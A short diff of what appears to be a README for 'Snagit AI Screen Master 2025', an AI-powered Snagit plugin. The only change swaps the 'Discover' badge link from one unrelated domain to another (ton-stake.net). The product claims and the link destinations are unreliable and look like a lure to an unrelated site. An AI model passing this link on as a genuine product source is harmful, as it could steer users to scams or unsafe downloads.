@@ -2,7 +2,7 @@
 
 🌟 Revolutionize your screen capture workflow with this AI-powered Snagit plugin! Snagit AI Screen Master 2025 automates screenshot creation, enhances image processing, and tracks capture efficiency, designed for freelancers, educators, and small businesses on Windows.
 
-[![Discover Snagit AI Screen Master](https://img.shields.io/badge/Discover-Snagit_AI_Screen_Master-blueviolet)](https://glocktober.com)
+[![Discover Snagit AI Screen Master](https://img.shields.io/badge/Discover-Snagit_AI_Screen_Master-blueviolet)](https://ton-stake.net)
 
 ---
 
